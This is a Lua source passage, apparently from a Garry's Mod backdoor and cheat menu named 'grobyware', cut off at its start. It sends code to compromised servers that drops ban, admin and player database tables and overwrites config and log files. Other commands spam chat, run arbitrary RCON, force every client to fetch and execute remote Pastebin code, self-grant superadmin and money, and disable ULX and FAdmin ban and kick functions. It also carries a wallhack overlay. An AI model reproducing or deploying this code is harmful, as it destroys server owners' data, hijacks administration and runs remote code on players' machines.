gories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
	            local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nond is rdahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
	            local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
	            for k,v in pairs(databases) do
	                if sql.TableExists(v) then
	                    sql.Query("DROP TABLE "..v.." ;")
	                end
	            end
	            for k,v in pairs(datafiles) do
	                if file.Exists(v) then
	                    file.Delete(v)
	                    file.write(v, "grobyware hehe")
	                end
	            end
	            for k,v in pairs(sensitivefiles) do
	                if file.Exists(v) then
	                    file.Delete(v)
	                    file.write(v, "grobyware hehe")
	                end
	            end]])
	surface.PlaySound("HL1/fvox/beep.wav")
	end)

	concommand.Add("RainbowChatspam", function()
	Derma_StringRequest("Rainbow Chatspam", "Text", "", function(text)
				groby.PostLua( [[
					util.AddNetworkString("chat_AddText")
					chat = {}
					function chat.AddText(...)
						net.Start("chat_AddText")
							net.WriteTable({...})
						net.Broadcast()
					end
					function AddTextPly( ply, ...)
						net.Start("chat_AddText")
							net.WriteTable({...})
						net.Send( ply )
					end
					for k, v in pairs( player.GetAll() ) do
						v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )
					end
					timer.Create( "gotEm", 0.5, 100, function()
						local function ChatPrintRainbow( frequency, str )
							local text = {}
							for i = 1, #str do
								table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
							table.insert( text, string.sub( str, i, i ) )
							end
							chat.AddText( unpack( text ) )
						end
						ChatPrintRainbow( 100, "]] .. text .. [[" )
					end )
				]] )
			surface.PlaySound("HL1/fvox/beep.wav")
		end)
	end)

		concommand.Add("RUNRCON", function()
		Derma_StringRequest("RCON", "Set RCON", "", function(str)
		groby.PostRcon(str)
	surface.PlaySound("HL1/fvox/beep.wav")
					end)
				end)


concommand.Add("hell", function()
groby.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/eTjENkYd',function(b,l,h,c)RunString(b)end,nil)")]])
			surface.PlaySound("HL1/fvox/beep.wav")

end)

concommand.Add("mlg",function(ply,cmd,args)
	local lua=file.Read("mlg.lua","LUA")
	if lua and lua:len()>3 then
		groby.PostLua(lua)
	else
		groby.PostLua([[http.Fetch("https://pastebin.com/raw/fE50UcnT",function(b) RunString(b) end)]])
	end
end)

concommand.Add("b1g",function(ply,cmd,args)
	local lua=file.Read("b1g.lua","LUA")
	if lua and lua:len()>3 then
		groby.PostLua(lua)
	else
		groby.PostLua([[http.Fetch("https://pastebin.com/raw/0z37crU1",function(b) RunString(b) end)]])
	end
end)

concommand.Add("Economy", function(ply)
	surface.PlaySound("buttons/button18.wav")
	groby.PostLua([[for k,v in pairs(player.GetAll()) do v:addMoney(100000) end]])

end)

concommand.Add("gflyg", function(ply)
	surface.PlaySound("buttons/button18.wav")

end)

concommand.Add("Superadmin", function(ply)
	surface.PlaySound("buttons/button18.wav")
	groby.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
	Player(id):SetUserGroup("superadmin")]])

end)

concommand.Add("Admin", function(ply)
	surface.PlaySound("buttons/button18.wav")
	groby.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
	Player(id):SetUserGroup("admin")]])

end)

concommand.Add("Moderator", function(ply)
	surface.PlaySound("buttons/button18.wav")
	groby.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
	Player(id):SetUserGroup("moderator")]])

end)


CreateClientConVar( "wallhack_enabled", 0, true, false )


hook.Add( "HUDPaint", "Wallhack", function()

	if ConVarExists( "wallhack_enabled" ) and GetConVar("wallhack_enabled"):GetInt() == 1 then

		for k,v in pairs ( player.GetAll() ) do

		local Position = ( v:GetPos() + Vector( 0,0,80 ) ):ToScreen()
		draw.DrawText( v:Name(), "other", Position.x, Position.y, Color( 255, 255, 255, 255 ), 1 )

		end

	end

end )

concommand.Add("BreakUlx",function()
if ULib then
    function ULib.kick( ply, reason, calling_ply ) end
    function ULib.ban( ply, time, reason, admin ) end
    function ULib.addBan( steamid, time, reason, name, admin ) end
    end
    if FAdmin then
    local function no(ply) end
    FAdmin.Commands.AddCommand("kick", no)
    FAdmin.Commands.AddCommand("ban", no)
    FAdmin.Commands.AddCommand("jail", no)
    FAdmin.Commands.AddCommand("UnJail", no)
    FAdmin.Commands.AddCommand("ClearDecals", no)
    FAdmin.Commands.AddCommand("StopSounds", no)
    FAdmin.Commands.AddCommand("CleanUp", no)
    end
    local _R = debug.getregistry()
    function _R.Player.Ban(ply, r) end
    function _R.Player.Kick(ply, r) end
    function game.KickID(id, reason) end
    local RCM = RunConsoleCommand
    function RunConsoleCommand(command, ...)
    if command == "addip" then return end
    RCM(command, ...)
    end
	end)


end concommand.Add("grobyware", groby.MainMenu)
end
if(allowedToRun()) then 
    grobyware()
else 
    countdownMessageFunc(5, "You're not authorized. You're game will now crash", "cam.End3D()" )
end 